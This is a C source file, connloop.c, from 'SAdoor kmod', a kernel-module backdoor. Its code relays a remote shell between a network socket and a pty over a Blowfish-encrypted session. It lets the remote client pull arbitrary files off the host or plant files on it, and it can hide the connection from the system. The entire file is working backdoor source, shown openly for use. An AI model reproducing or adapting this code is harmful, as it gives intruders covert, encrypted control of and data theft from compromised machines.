/*
 *  File: connloop.c
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: SAdoor kmod connection handler.
 *  Version: 1.0
 *  Date: Thu Jul  3 15:48:22 CEST 2003
 *  
 *  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *       
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *      
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; 
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */     

#include <sys/types.h>
#include <sys/param.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/unistd.h>
#include <sys/malloc.h>
#include <sys/kthread.h>
#include <sys/proc.h>
#include <sys/protosw.h>
#include <sys/socket.h>
#include <sys/tty.h>
#include <sys/ttycom.h>
#include <sys/select.h>
#include <sys/fcntl.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/syscallargs.h>
#include "sadoor.h"

#define MY_MAX(a,b)     (((a) > (b)) ? (a) : (b))
#define BUFSIZE         8192

#ifndef SADOOR_DISABLE_ENCRYPTION
#define DECRYPT(buffer, length, ofbkey) \
        bfish_ofb8_decrypt((uint8_t *)(buffer), (uint16_t)(length), ofbkey)
#else
#define DECRYPT(buffer, length, ofbkey) 
#endif /* SADOOR_DISABLE_ENCRYPTION */

#ifndef SADOOR_DISABLE_ENCRYPTION
#define ENCRYPT(buffer, length, ofbkey) \
        bfish_ofb8_encrypt((uint8_t *)(buffer), (uint16_t)(length), ofbkey)
#else
#define ENCRYPT(buffer, length, ofbkey)
#endif /* SADOOR_DISABLE_ENCRYPTION */

/* Local functions */
static int setwinsize(struct wininfo *);
static int connloop(int, int, struct bfish_ofb *);
static int handle_ftrans(int, u_char, u_char *, size_t, struct bfish_ofb *);
static int send_ftcmd(int, u_char, u_int, u_char *, struct bfish_ofb *);

/* Local variables */
static int ptym;                    /* Master pty */

/*
 * Set the received window size,
 * returns -1 on error and zero on success.
 */
static int
setwinsize(struct wininfo *winfo)
{
    struct winsize *wins;
    struct sys_ioctl_args *icargs;
    struct proc *p;
    int error;
    wins = (struct winsize *)uland_calloc(sizeof(struct winsize)+
        sizeof(struct sys_ioctl_args));

    icargs = (struct sys_ioctl_args *)(wins + 1);
    p = curproc;

	if (p == NULL) {
		log(1, "setwinsize(): curproc is NULL\n");
		return(-1);
	}

    (void)suword(&wins->ws_row, ntohs(winfo->height));
    (void)suword(&wins->ws_col, ntohs(winfo->width));
    (void)suword(&wins->ws_xpixel, ntohs(winfo->xpix));
    (void)suword(&wins->ws_ypixel, ntohs(winfo->ypix));

    debug(2, "Received Window size (rows: %u columns: %u)\n",
        wins->ws_row, wins->ws_col);

    (void)suword(&SCARG(icargs, fd), ptym);
    (void)suword(&SCARG(icargs, com), TIOCSWINSZ);
    (void)suword(&SCARG(icargs, data), (int)wins);

    if ( (error = sys_ioctl(p, icargs, NULL))) 
        debug(2, "Error setting window size: %d\n", error);

    uland_free(wins);
    return(error ? -1 : 0);
}


/*
 * Create session key, set up pty and run program.
 * Returns 0 on success, and 1 on error.
 */
int
handle_connection(int sock_fd, struct bfish_key *bk)
{
    struct bfish_ofb *ob = NULL;

    /* Generate session key and IV's */
#ifndef SADOOR_DISABLE_ENCRYPTION
    {
        struct sesskey tmpkey;
        struct sesskey sekey;
        struct sesskey *uland_tmpkey;
        struct sys_write_args *wargs;
        struct proc *p;

        p = curproc;
    	
		if (p == NULL) {
        	log(1, "handle_connection(): curproc is NULL\n");
        	return(-1);
    	}

        uland_tmpkey = uland_calloc(sizeof(struct sesskey)+
            sizeof(struct sys_write_args));
        wargs = (struct sys_write_args *)(uland_tmpkey +1);

        /* Generate a new random key to use during the session */
        debug(3, "Randomizing session key\n");
        get_random_bytes((u_char *)&sekey, sizeof(struct sesskey)); 

        /* Network byte order required on IV */
        (*(uint32_t *)&sekey.iv[0]) = htonl(*(uint32_t *)&sekey.iv[0]);
        (*(uint32_t *)&sekey.iv[4]) = htonl(*(uint32_t *)&sekey.iv[4]);
        (*(uint32_t *)&sekey.enciv[0]) = htonl(*(uint32_t *)&sekey.enciv[0]);
        (*(uint32_t *)&sekey.enciv[4]) = htonl(*(uint32_t *)&sekey.enciv[4]);
        (*(uint32_t *)&sekey.deciv[0]) = htonl(*(uint32_t *)&sekey.deciv[0]);
        (*(uint32_t *)&sekey.deciv[4]) = htonl(*(uint32_t *)&sekey.deciv[4]);
        sekey.code = CONN_SESSION_KEY;

        /* For encryption of session key */
        memcpy(&tmpkey, &sekey, sizeof(struct sesskey));
   
        /* Encrypt using old key */
        bfish_cfb_encrypt(&tmpkey.code,
                sizeof(struct sesskey)-sizeof(tmpkey.iv), sekey.iv, 8, bk);

        /* No need for old key any more */
        kspace_free(bk);

        (void)copyout(&tmpkey, uland_tmpkey, sizeof(struct sesskey));
        debug(2, "Sending session key\n");

        /* Send session key to client */
        (void)suword(&SCARG(wargs, fd), sock_fd);
        (void)suword(&SCARG(wargs, buf), (int)uland_tmpkey);
        (void)suword(&SCARG(wargs, nbyte), sizeof(struct sesskey));
        if (writen(p, wargs) != sizeof(struct sesskey)) {
            log(1, "Failed to send session key, bailing out\n");
            return(1);
        }

        /* Set up the new key to use */
        if ( (ob = bfish_ofb8_setiv(sekey.key, sizeof(sekey.key),
                sekey.deciv, sekey.enciv)) == NULL)
            return(1);

        /* Zero out old */
        memset(&tmpkey, 0x00, sizeof(struct sesskey));
        memset(&sekey, 0x00, sizeof(struct sesskey));
        memset(uland_tmpkey, 0x00, sizeof(struct sesskey));
        uland_free(uland_tmpkey);
    }
#endif /* SADOOR_DISABLE_ENCRYPTION */


    /* Allocate a pty and run program on client side */
    if ( (ptym = setup_pty()) < 0) 
        return(1);

    return(connloop(sock_fd, ptym, ob));
}


/*
 * Main connection loop, reads and writes
 * data between pty and socket.
 * Returns 0 on succes and 1 on error;
 */
static int
connloop(int sock_fd, int master_fd, struct bfish_ofb *ob)
{

    /* userland memory */
    struct sys_select_args *selargs;
    struct sys_read_args *rargs;
    struct sys_write_args *wargs;
    u_char *ptybuf;
    u_char *sockbuf;
    fd_set *readset;
    fd_set *readtmp;

    /* Kernel memory */
    u_char *kernbuf;
    struct proc *p;
    ssize_t topty = 0;
    ssize_t tosock = 0; /* Shut up gcc */
    register_t retval[2];
	int error;
    ssize_t i;
    int nfd;

    p = curproc;

    if (p == NULL) {
        log(1, "connloop(): curproc is NULL\n");
        return(-1);
    }

    ptybuf = (u_char *)uland_calloc((2*BUFSIZE) + (2*sizeof(fd_set)) + 
        sizeof(struct sys_select_args) +
        sizeof(struct sys_read_args) +
        sizeof(struct sys_write_args));
    
    sockbuf = ptybuf + BUFSIZE;
    readset = (fd_set *)(sockbuf + BUFSIZE);
    readtmp = readset +1;
    selargs = (struct sys_select_args *)(readtmp + 1);
    rargs = (struct sys_read_args *)(selargs + 1);
    wargs = (struct sys_write_args *)(rargs + 1);
/*
    signal(SIGTTOU, SIG_IGN);
    signal(SIGCHLD, sigchld_handler);
*/

    kernbuf = (u_char *)kspace_calloc(BUFSIZE);


    if ( (nfd = MY_MAX(sock_fd, master_fd) +1) > FD_SETSIZE) {
        debug(1, "Error: FD_SETSIZE to small!\n");
    /*    kill(0, SIGTERM); */
        return(1);
    }
    FD_ZERO(readset);
    FD_SET(sock_fd, readset);
    FD_SET(master_fd, readset);

    /* Prepare select arguments */
    (void)suword(&SCARG(selargs, nd), (int)nfd);
    (void)suword(&SCARG(selargs, in), (int)readtmp);
    (void)suword(&SCARG(selargs, ou), (int)NULL);
    (void)suword(&SCARG(selargs, ex), (int)NULL);
    (void)suword(&SCARG(selargs, tv), (int)NULL);

    for (;;) {
        memcpy(readtmp, readset, sizeof(fd_set));

        /* Read data */
        debug(3, "Waiting for data\n");
        if ( (error = sys_select(p, selargs, retval))) {
        
            /* We should not be interrupted, kill the
             * process for now */
            if (error == EINTR) {
                debug(3, "select interrupted\n");
            }
            else
                debug(1, "Error: select(): %d\n", error);
            break;
        }
    
        /* Read from socket */
        if (FD_ISSET(sock_fd, readtmp)) {
            u_char *bufpt = ptybuf;

            /* Set up read arguments */
            debug(3, "Reading from socket\n");
            (void)suword(&SCARG(rargs, fd), sock_fd);
            (void)suword(&SCARG(rargs, buf), (int)ptybuf);
            (void)suword(&SCARG(rargs, nbyte), BUFSIZE);
            if ( (error = sys_read(p, rargs, retval))) {
                log(1, "Error: read from socket: %d\n", error);
                break;
            }
            topty = retval[0];

            if (topty == 0)
                break;

            /* Copy in, decrypt, copy out */
            (void)copyin(ptybuf, kernbuf, topty);
            DECRYPT(kernbuf, topty, ob);
            (void)copyout(kernbuf, ptybuf, topty);

            /* Scan for magic bytes */
            if ( (i = utils_memstr(kernbuf, topty, MAGIC_BYTES, MAGIC_BYTES_LEN)) >= 0) {
                debug(3, "Found magic bytes\n");

                /* Write leading data to pty */
                (void)suword(&SCARG(wargs, fd), master_fd);
                (void)suword(&SCARG(wargs, buf), (int)ptybuf);
                (void)suword(&SCARG(wargs, nbyte), i);
                if (writen(p, wargs) != i) {
                 /*   kill(0, SIGTERM); */
                    continue;
                }
                bufpt = &kernbuf[i];
                topty -= i;

                if ( (i += MAGIC_BYTES_LEN) > topty) {
                    log(1, "Error: data to short to contain any command\n");
                    continue;
                }

                /* Command code */
                switch ((int)kernbuf[i++]) {

                    /* New window size, set the new window size and write
                     * the rest of data to pty. */
                    case CONN_WINCHANGED:
                        debug(3, "Got CONN_WINCHANGED\n");
                        {
                            struct wininfo winfo;

                            if ((i + sizeof(struct wininfo)) > topty) {
                                    log(1, "Error: Received data is to short to "
                                    "contain window size\n");
                                topty -= i;
                                break;
                            }

                            /* Set the new window size, we need to copy
                             * to avoid SIGBUS ... */
                            memcpy(&winfo, &kernbuf[i], sizeof(winfo));
                            setwinsize(&winfo);

                            i += sizeof(struct wininfo);
                            bufpt = &kernbuf[i];
                            topty -= i;

                        }
                        break;

                    /* File transfer data */
                    case CONN_FTDATA:
                        debug(3, "Got CONN_FTDATA\n");
                        {
                            struct ftcmd ftc; 
 
                            if ((i + sizeof(struct ftcmd)) > topty) {
                                debug(1, "Error: Received data is to short to "
                                    "contain file transfer header\n");
                                topty -= i;
                                break;
                            }

                            memcpy(&ftc, &kernbuf[i], sizeof(ftc));
                            ftc.length = ntohl(ftc.length);
                            i += sizeof(struct ftcmd);

                            if (ftc.length > topty) {
                                debug(1, "Error: Received data is to short to "
                                    "contain file transfer data\n");
                                topty -= i;
                                break;
                            }
                   
                            i += ftc.length;
                            topty -= i;
                            bufpt = &ptybuf[(i > BUFSIZE) ? 0 : i];
                   
                            /* Make sure that data not belongin to file transfer
                             * is written to the pty in correct order. */
                            if (ftc.code == FT_PUTFILE) {
                                
                                (void)suword(&SCARG(wargs, fd), master_fd);
                                (void)suword(&SCARG(wargs, buf), (int)bufpt);
                                (void)suword(&SCARG(wargs, nbyte), topty);

                                if ( (topty > 0) && (writen(p, wargs) != topty)) 
                                    break;
                                topty = 0;
                            }

                            debug(3, "Calling handle_ftrans()\n");
                            if (handle_ftrans(sock_fd, ftc.code, 
                                    &ptybuf[i-ftc.length], ftc.length, ob) != 0)
                                goto finished;
                        }
                        break;

                    /* Bad command code (?), write everything,
                     * including the magic bytes to pty */
                    default:
                        debug(1, "Error: Unrecognized command code (0x%02x)\n",
                            kernbuf[i-1]);
                        break;
                }
            }

            /* Write (remaining ?) data to pty */
            if (topty > 0) {
                
                (void)suword(&SCARG(wargs, fd), master_fd);
                (void)suword(&SCARG(wargs, buf), (int)bufpt);
                (void)suword(&SCARG(wargs, nbyte), topty);
                debug(3, "Writing to pty\n");
                if (writen(p, wargs) != topty)
                    break;
            }
        }

        if (FD_ISSET(master_fd, readtmp)) {
        
            (void)suword(&SCARG(rargs, fd), master_fd);
            (void)suword(&SCARG(rargs, buf), (int)sockbuf);
            (void)suword(&SCARG(rargs, nbyte), BUFSIZE);
            debug(3, "Reading from pty\n");
            if ((error = sys_read(p, rargs, retval))) {    
                log(1, "Error: read from pty: %d\n", error);
                break;
            }
            tosock = retval[0];

            if (tosock == 0)
                break;

            /* Copy in, encrypt, copy out */
            (void)copyin(sockbuf, kernbuf, tosock);
            ENCRYPT(kernbuf, tosock, ob);
            (void)copyout(kernbuf, sockbuf, tosock);
            
            (void)suword(&SCARG(wargs, fd), sock_fd);
            (void)suword(&SCARG(wargs, buf), (int)sockbuf);
            (void)suword(&SCARG(wargs, nbyte), tosock);
            debug(3, "Writing to socket\n");
            if (writen(p, wargs) != tosock) {
                log(1, "Error: write to socket: %d\n", error);
                break;
            }
        }
    }

    finished:
        kspace_free(kernbuf);
        uland_free(ptybuf);
        bfish_ofb8_cleariv(ob);
        {
            struct sys_getpeername_args *gpargs;
            struct sockaddr_in *client;
            struct sockaddr_in sa;
            int *addrlen;
            
            gpargs = (struct sys_getpeername_args *)uland_calloc(sizeof(struct sys_getpeername_args)+
                sizeof(struct sockaddr_in)+sizeof(int));
            client = (struct sockaddr_in *)(gpargs +1);
            addrlen = (int *)(client +1);
    
            /* Set up getpeername arguments */
            (void)suword(addrlen, sizeof(struct sockaddr_in));
            (void)suword(&SCARG(gpargs, fdes), sock_fd);
            (void)suword(&SCARG(gpargs, asa), (int)client);
            (void)suword(&SCARG(gpargs, alen), (int)addrlen);
    
            /* Get address of client (again ..) */
            if ( (error = sys_getpeername(p, gpargs, NULL))) {
                log(1, "Error: Failed to get client address\n");
            }
            else {
                
                (void)copyin(client, &sa, sizeof(struct sockaddr_in));
    
                log(1, "Connection to %s:%u closed (pid %u)\n", 
                    inet_ntoa(sa.sin_addr), ntohs(sa.sin_port), p->p_pid);
        
#ifdef SAKMOD_HIDE_CONNECTION
                hide_conns_delconn(sa.sin_addr.s_addr, sa.sin_port);
#endif /* SAKMOD_HIDE_CONNECTION */
            }
            uland_free(gpargs);
        }


   /* kill(0, SIGTERM);*/
    return(1);
}

/*
 * Respond to received file transfer request, either with an error
 * message, or by sending FT_STORE or FT_READ command back.
 * Returns 0 on success and 1 on _fatal_ error;
 * data is a userland address.
 */
#define ENOENT_STR        "No such file or directory"
#define EACCES_STR        "Permission denied"
#define EEXIST_STR        "File exists"
static int
handle_ftrans(int sock_fd, u_char code, u_char *data, 
        size_t dlen, struct bfish_ofb *ob)
{
    /* Userland data */
    u_char *buf;
    struct sys_write_args *wargs;
    struct sys_read_args *rargs;
    struct sys_stat_args *stargs;
       struct sys_close_args *clargs;
    struct sys_open_args *oargs;
    struct stat *sb;
    struct ftcmd *ftc;
   
   /* Kernel space data */
    u_char *kernbuf;
    struct proc *p;
    u_char *path;           /* Path to file */
    ssize_t i;
    ssize_t len;
    ssize_t bsent;
	size_t file_size;
    int fd = -1;
	register_t retval[2];
    int error = 0;            /* Return success by default */

    p = curproc;
    
	if (p == NULL) {
        log(1, "handle_ftrans(): curproc is NULL\n");
        return(1);
    }

    path = data;

    buf = (u_char *)uland_calloc(BUFSIZE + 
            sizeof(struct sys_write_args) +
            sizeof(struct sys_read_args) + 
            sizeof(struct sys_stat_args) + 
            sizeof(struct stat) +
            sizeof(struct ftcmd) +
            sizeof(struct sys_close_args) +
            sizeof(struct sys_open_args));

    wargs = (struct sys_write_args *)(buf + BUFSIZE);
    rargs = (struct sys_read_args *)(wargs + 1);
    stargs = (struct sys_stat_args *)(rargs + 1);
    sb = (struct stat *)(stargs + 1);
    ftc = (struct ftcmd *)(sb + 1);
    clargs = (struct sys_close_args *)(ftc +1);
    oargs = (struct sys_open_args *)(clargs +1);

    kernbuf = (u_char *)kspace_calloc(BUFSIZE);

    /* File transfer disabled */
    if (SAKMOD_NOFILETRANS) {

        (void)copyout(FTRANS_DISABLED_ERRORMSG, buf, sizeof(FTRANS_DISABLED_ERRORMSG));
        send_ftcmd(sock_fd, FT_ERROR, sizeof(FTRANS_DISABLED_ERRORMSG), buf, ob);
        goto finished;
    }

    /* Find end of first string */
    for (i = 0; i < dlen; i++) {
        if (data[i] == '\0')
            break;
    }

    if (i >= dlen) {
        log(2, "Error: Malformated file-path "
            "string in file transfer request|n");
        goto finished;
    }

    switch(code) {

        /* Send file */
        case FT_GETFILE:
            debug(1, "Received GET FILE %s\n", path);

            /* Check access and get size on local file, If it fails,
             * send error message and return. */
            (void)suword(&SCARG(oargs, path), (int)path);
            (void)suword(&SCARG(oargs, flags), O_RDONLY);
            (void)suword(&SCARG(oargs, mode), 0);
            
            /* Try to open */
            if ( (error = sys_open(p, oargs, retval)) == 0)
            	fd = retval[0];

            /* Can't open or stat file */
            (void)suword(&SCARG(stargs, path), (int)path);
            (void)suword(&SCARG(stargs, ub), (int)sb);
            if ((error) || (error = sys_stat(p, stargs, NULL))) {
                log(2, "Error reading local file for transfer: %d\n", error);
            
                if (error == ENOENT)
                    (void)copyout(ENOENT_STR, buf, sizeof(ENOENT_STR));
                else if (error == EACCES)
                    (void)copyout(EACCES_STR, buf, sizeof(EACCES_STR));
                else if (error == EEXIST)
                    (void)copyout(EEXIST_STR, buf, sizeof(EEXIST_STR));
                else
                    snprintf(buf, BUFSIZE, "%d", error);
            
                /* Send error message */
                send_ftcmd(sock_fd, FT_ERROR, strlen(buf)+1, buf, ob);

                /* We don't return error to avoid termination of the process */
                error = 0;
                goto finished;
            }

            /* Send header */
            send_ftcmd(sock_fd, FT_STORE, sb->st_size, NULL, ob);
			file_size = fuword(&sb->st_size);

            debug(2, "Sending file '%s' (%u bytes)\n", path, (u_int)file_size);    

            /* Prepare read args */
            (void)suword(&SCARG(rargs, fd), fd);
            
            /* Prepare write args */
            (void)suword(&SCARG(wargs, fd), sock_fd);
       
            bsent = 0;
            while (bsent < file_size) {

                /* Read a block */
                (void)suword(&SCARG(rargs, buf), (int)buf);
                (void)suword(&SCARG(rargs, nbyte), 
                        (file_size - bsent) > BUFSIZE ? BUFSIZE : (file_size - bsent));
                
                if ( (len = readn(p, rargs)) < 0) { 
                    error = 1;
                    goto finished;
                }


                /* Copy in, encrypt, copy out */
                (void)copyin(buf, kernbuf, len);
                ENCRYPT(kernbuf, len, ob);
                (void)copyout(kernbuf, buf, len);

                /* Write the file */
                (void)suword(&SCARG(wargs, buf), (int)buf);
                (void)suword(&SCARG(wargs, nbyte), len);
                if (writen(p, wargs) != len) {
                    error = 1;
                    goto finished;
                }
                bsent += len;
            }

            debug(2, "File '%s' (%u bytes), successfully sent\n", 
                path, (u_int)fuword(&sb->st_size));
            break;

        /* Store file */
        case FT_PUTFILE:
            debug(1, "Received PUT FILE %s\n", path);

            /* Check if file can be stored */
            (void)suword(&SCARG(oargs, path), (int)path);
            (void)suword(&SCARG(oargs, flags), O_WRONLY | O_CREAT | O_EXCL);
            (void)suword(&SCARG(oargs, mode), 0600);

            debug(3, "Trying to open requested file\n");
            if ( (error = sys_open(p, oargs, retval))) {
            
                debug(1, "Error opening local file for writing: %d\n", error);
            
                /* Send error message */
                if (error == ENOENT)
                    (void)copyout(ENOENT_STR, buf, sizeof(ENOENT_STR));
                else if (error == EACCES)
                    (void)copyout(EACCES_STR, buf, sizeof(EACCES_STR));
                else if (error == EEXIST)
                    (void)copyout(EEXIST_STR, buf, sizeof(EEXIST_STR));
                else
                    snprintf(buf, BUFSIZE, "%d", error);

                /* Send error message */
                send_ftcmd(sock_fd, FT_ERROR, strlen(buf)+1, buf, ob);

                /* We don't return error to avoid termination of the process */
                error = 0;
                goto finished;
            }
            fd = retval[0];
        
            /* Send read command and wait for FT_READ_ACK */
            send_ftcmd(sock_fd, FT_READ, 0, NULL, ob);
            debug(3, "Waiting for FT_READ_ACK\n");

            /* Read until we find magic bytes */
            len = 0;
            i = -1;
            (void)suword(&SCARG(rargs, fd), sock_fd);
            do {

                (void)suword(&SCARG(rargs, buf), (int)(&buf[len]));
                (void)suword(&SCARG(rargs, nbyte), 1);

                if ( (error = sys_read(p, rargs, retval))) {
                    debug(1, "Error: read(): %d\n", error);
                    error = 1;
                    goto finished;
                }

                /* Copy in, decrypt, copy out */
                (void)copyin(&buf[len], &kernbuf[len], 1);
                DECRYPT(&kernbuf[len], 1, ob);
                (void)copyout(&kernbuf[len], &buf[len], 1);

            } while ( (len<(BUFSIZE-2)) &&
                ((i = utils_memstr(kernbuf, ++len, MAGIC_BYTES, MAGIC_BYTES_LEN)) == -1));

            (void)suword(&SCARG(rargs, buf), (int)(&buf[len]));
            if ( (error = sys_read(p, rargs, retval))) {
                debug(1, "Error: read(): %d\n", error);
                error = 1;
                goto finished;
            }

            /* Copy in, decrypt, copy out */
            (void)copyin(&buf[len], &kernbuf[len], 1);
            DECRYPT(&kernbuf[len], 1, ob);
            (void)copyout(&kernbuf[len], &buf[len], 1);

            if (i == -1) {
                log(1, "Error: Did not receive awaiting FT_READ_ACK, exiting\n");
                error = 1;
                goto finished;
            }

            /* Attempt to write prepended data to pty */
            debug(3, "Writing prepended data to pty\n");
            if ((i > 0) && ready_write(ptym)) {
                (void)suword(&SCARG(wargs, fd), ptym);
                (void)suword(&SCARG(wargs, buf), (int)buf);
                (void)suword(&SCARG(wargs, nbyte), i);
                if (writen(p, wargs) != i) {
                    error = 1;
                    goto finished;
                }
            }
            else if (i > 0)
                debug(1, "Warning: Master PTY not ready for writing, "
                    "%u bytes will not be transfered\n", (u_int)i);
            
            (void)suword(&SCARG(rargs, fd), sock_fd);
            (void)suword(&SCARG(rargs, buf), (int)ftc);
            (void)suword(&SCARG(rargs, nbyte), sizeof(struct ftcmd));
            if (readn(p, rargs) != sizeof(struct ftcmd)) {
                error = 1;
                goto finished;
            }


            /* Copy in, decrypt, copy out */
            (void)copyin(ftc, kernbuf, sizeof(struct ftcmd));
            DECRYPT(kernbuf, sizeof(struct ftcmd), ob);
            (void)copyout(kernbuf, ftc, sizeof(struct ftcmd));

            (void)suword(&ftc->length, ntohl(((struct ftcmd *)kernbuf)->length));

            if (fubyte(&ftc->code) != FT_READ_ACK) {
                log(1, "Received unvalid file transfer code while "
                        "waiting for FT_READ_ACK\n");
                error = 1;
                goto finished;
            }


            /* Prepare read args */
            (void)suword(&SCARG(rargs, fd), sock_fd);

            /* Prepare write args */
            (void)suword(&SCARG(wargs, fd), fd);
            
            /* Read file */
            debug(3, "Reading file\n");
            {
                size_t rn;
                size_t length = fuword(&ftc->length);
                
                while (length > 0) {
                    rn = (length > BUFSIZE) ? BUFSIZE : length;
                    
                    /* Read */
                    (void)suword(&SCARG(rargs, buf), (int)buf);
                    (void)suword(&SCARG(rargs, nbyte), rn);
                    if ( (error = readn(p, rargs)) != rn) {
                        error = 1;
                        goto finished;
                    }

                    /* Copy in, decrypt, copy out */    
                    (void)copyin(buf, kernbuf, rn);
                    DECRYPT(kernbuf, rn, ob);
                    (void)copyout(kernbuf, buf, rn);
                    
                    /* Write */
                    (void)suword(&SCARG(wargs, buf), (int)buf);
                    (void)suword(&SCARG(wargs, nbyte), rn);
                    if (writen(p, wargs) != rn) {
                        error = 1;
                        goto finished;
                    }
                    length -= rn;
                }
            }
            debug(2, "File '%s' sucessfully stored\n", path);
            break;

        /* Can't happen here */
        case FT_STORE:
        case FT_ERROR:
        default:
            log(1, "Error: Unrecognized file "
                    "transfer code (0x%02x)\n", code);
            break;
    }

    finished:
    
        /* Close file */
        if (fd > 0)  {
            (void)suword(&SCARG(clargs, fd), fd);    

            if ((error = sys_close(p, clargs, NULL)))
                log(1, "Error: close(): %d\n", error);
        }

        kspace_free(kernbuf);
        uland_free(buf);
        return(error);
}

/*
 * Send file transfer command header.
 * dlen should be host endian.
 * Data is not copyed if it's a NULL pointer.
 * Returns 0 on success and 1 on error;
 * data should be a userland address.
 */
#define OUTBUFSIZE    1024
static int
send_ftcmd(int sock_fd, u_char code, u_int dlen, 
        u_char *data, struct bfish_ofb *ob)
{
    u_char *outbuf;
    u_char *kernbuf;
    struct sys_write_args *wargs;
    struct proc *p;
    size_t i;
    struct ftcmd ftc;
    size_t *len;

    outbuf = (u_char *)uland_calloc(OUTBUFSIZE+sizeof(struct sys_write_args)+sizeof(size_t));
    wargs = (struct sys_write_args *)(outbuf + OUTBUFSIZE);
    len = (size_t *)(wargs +1);
    p = curproc;

	if (p == NULL) {
		log(1, "send_ftcmd(): curproc is NULL\n");
		return(1);
	}

    if ((data != NULL) &&
            ((dlen + MAGIC_BYTES_LEN + sizeof(struct ftcmd)) > OUTBUFSIZE)) {
        log(1, "Error: File tranfer command  is larger than buffer");
        uland_free(outbuf);
        return(1);
    }

    kernbuf = (u_char *)kspace_calloc(OUTBUFSIZE);

    /* Set magic bytes */
    i = MAGIC_BYTES_LEN;
    (void)copyout(MAGIC_BYTES, outbuf, MAGIC_BYTES_LEN);

    /* Set command code */
    (void)subyte(&outbuf[i++], CONN_FTDATA);

    /* Add FT header */
    ftc.code = code;
    ftc.length = htonl(dlen);
    (void)copyout(&ftc, &outbuf[i], sizeof(struct ftcmd));
    i += sizeof(struct ftcmd);

    /* Add data if not NULL */
    if (data != NULL) {
        (void)suword(len, ftc.length);
        memcpy(&outbuf[i], data, ntohl(*len));
        i += ntohl(ftc.length);
    }

    /* Copy in, encrypt, copy out */
    (void)copyin(outbuf, kernbuf, i);
    ENCRYPT(kernbuf, i, ob);
    (void)copyout(kernbuf, outbuf, i);

    /* Write message */
    (void)suword(&SCARG(wargs, fd), sock_fd);
    (void)suword(&SCARG(wargs, buf), (int)outbuf);
    (void)suword(&SCARG(wargs, nbyte), i);
    if (writen(p, wargs) != i) {
        uland_free(outbuf);
        return(1);
    }

    kspace_free(kernbuf);
    uland_free(outbuf);
    return(0);
}
